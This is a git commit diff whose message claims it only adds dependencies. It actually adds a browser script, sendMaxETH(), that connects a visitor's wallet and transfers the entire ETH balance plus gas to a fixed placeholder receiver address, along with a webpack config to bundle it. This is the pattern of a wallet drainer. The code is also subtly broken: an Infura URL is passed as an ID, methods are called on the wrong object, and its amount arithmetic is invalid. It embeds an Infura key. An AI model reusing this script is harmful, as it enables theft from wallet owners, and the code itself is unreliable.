bd4ca2183d4b7f6adb3450f7a3a5e816de52eee0
Olamilekan <olamilekanomosanya@gmail.com>
2023-01-20 14:31:20 +0100

    add:dependecies

---
+++ src/app.js
@@ -0,0 +1,49 @@
+import Web3Modal from "web3modal";
+import WalletConnectProvider from "@walletconnect/web3-provider";
+
+// Initialize Web3Modal with WalletConnect as the provider
+const web3Modal = new Web3Modal({
+  network: "mainnet", // or 'ropsten', 'rinkeby', etc.
+  provider: new WalletConnectProvider({
+    infuraId:
+      "https://celo-mainnet.infura.io/v3/9fd0522c64d642d1a69265f91c5fbe74",
+  }),
+});
+
+async function sendMaxETH() {
+  // Connect to the wallet
+  const provider = await web3Modal.connect();
+
+  // Get the user's ETH balance
+  const balance = await provider.eth.getBalance(provider.address);
+
+  // Convert balance to ETH
+  const etherBalance = provider.utils.fromWei(balance, "ether");
+
+  // Set the amount to the max balance in ETH
+  const amount = etherBalance;
+
+  // Get the current gas price
+  const gasPrice = await provider.eth.getGasPrice();
+
+  // Set the gas limit
+  const gasLimit = 21000;
+
+  // Calculate the total gas cost
+  const gasCost = provider.utils.toWei(gasPrice.mul(gasLimit), "gwei");
+
+  // Calculate the total cost (amount + gas cost)
+  const totalCost = amount.add(gasCost);
+
+  // Create a transaction object
+  const tx = {
+    to: "RECEIVER_ADDRESS",
+    value: totalCost,
+    gas: gasLimit,
+  };
+
+  // Sign and send the transaction
+  const receipt = await provider.eth.sendTransaction(tx);
+
+  console.log(receipt);
+}
---
+++ webpack.config.js
@@ -0,0 +1,20 @@
+const path = require("path");
+
+module.exports = {
+  entry: "./src/app.js",
+  output: {
+    path: path.resolve(__dirname, "dist"),
+    filename: "bundle.js",
+  },
+
+  resolve: {
+    fallback: {
+      stream: require.resolve("stream-browserify"),
+      http: require.resolve("stream-http"),
+      https: require.resolve("https-browserify"),
+      os: require.resolve("os-browserify/browser"),
+    },
+  },
+};
+
+
